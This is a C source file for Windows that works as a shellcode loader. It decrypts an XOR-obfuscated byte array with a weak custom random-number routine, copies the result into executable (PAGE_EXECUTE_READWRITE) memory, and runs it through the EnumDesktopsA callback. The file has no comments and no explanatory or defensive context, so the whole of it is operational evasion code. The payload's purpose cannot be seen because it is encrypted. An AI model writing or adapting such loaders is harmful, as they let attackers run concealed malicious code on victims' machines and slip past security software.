#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define MULTIPLIER 0x12345
#define INCREMENT  0x6789

uint32_t state = 0;

void seed(uint32_t seed_value) {
  state = seed_value;
}

uint32_t next_random() {
  state = (MULTIPLIER * state + INCREMENT);
  return state;
}

void mmb_encrypt(unsigned char *data, size_t len) {
  for(size_t i = 0; i < len; ++i) {
    uint32_t rand = next_random();
    data[i] ^= (rand & 0xFF);
  }
}

void mmb_decrypt(unsigned char *data, size_t len) {
  mmb_encrypt(data, len);
}

int main() {
  unsigned char padded[] =
  "\x1a\xcf\x6d\xc1\x72\x6c\xd7\xae\xb6\x0f\xa4\xbd\x7a\x2a\x31\x28\x86\x65\x0d\x03\x3a\x72\x4a\xe4\x06\x04\x46\x8d\x54\x53\x5b\xcb\xde\xd9\x84\x0e\x30\xd3\x36\xf9\xb5\x4d\xd4\x23\x12\xc4\xf7\x83\xfc\xda\x0d\x7c\x1a\x92\xb8\x4d\x12\x8e\x88\x4f\x66\x5b\xf1\x38\x6f\x4a\xed\xe4\x83\xb1\x05\x43\x5f\xce\x5a\x35\xb1\x79\x00\x17\x1d\xb5\x20\x5d\x33\xd3\x66\xca\x8e\xc7\xd4\xad\x2a\x93\x15\x99\xf2\xc8\xc4\x44\xf2\xe3\xf6\xfa\xb6\xe7\x7a\x99\x91\xcb\x20\xc0\x77\x87\x1f\x29\x5a\x9c\xf1\x9f\xaf\x24\x80\x85\x42\x3a\xa6\xf4\x57\xce\x24\x94\xc2\xbf\xe9\x10\x17\x52\x65\x3c\x3b\xd3\x00\x9c\xa7\x89\x90\xd6\xbe\xe7\x10\x44\xf7\xde\xe1\xbb\xb2\xa5\x14\x92\x06\x43\x05\x04\x32\x15\xb6\x70\x35\xb3\x4c\xa3\x9e\xc0\x80\x55\x7f\x16\x6c\x0b\x93\xa8\xfc\xe9\xe6\x6e\xa4\x8c\x92\xba\x68\x27\x7f\x9d\x6d\x3d\x83\x8a\x29\xcb\xd6\x9c\x08\xdd\xfb\xf9\x5f\x49\x4e\x36\xc5\xcf\x8c\xcb\x53\xd3\x67\x86\xab\xd2\x55\x06\x2e\x91\x8b\xaa\x22\xc4\xa2\x33\x09\x4b\x32\x08\xe2\x5a\x65\xde\xc9\xce\x37\xd7\x7c\xf5\x92\xdd\xf0\xac\xfb\x21\x35\x8d\x8a\x85\xbc\xb4\x63\x98\xed\x25\x82\xdb\x19\x98\x1f\x65\xe1\x3e\x2c\x6c\x9f\xbc\x9e\x06\x95\x14\xc8\xb3\x2d\x23\x18\x70\xc1\xa5\x03\x37\x99\xb9\xa7\x8a\xec\xd6\x0c\x9c\x7f\xc6\x51\x53\xe2\x1d\x1d\xa3\x2f\xba\xc2\xb7\x6b\xda\x3e\xc5\x58\xad\x4f\x8d\xf4\x38\x39\x1e\xc2\xca\x94\x69\xc8\x89\x2e\x53\x78\x81\x8e\x0f\xf4\xed\xaa\xbb\xb0\xb9";

  size_t pad_len = sizeof(padded);
  seed(12345);
  mmb_decrypt(padded, pad_len);
  LPVOID mem = VirtualAlloc(NULL, pad_len-2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, pad_len - 2);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

  return 0;
}
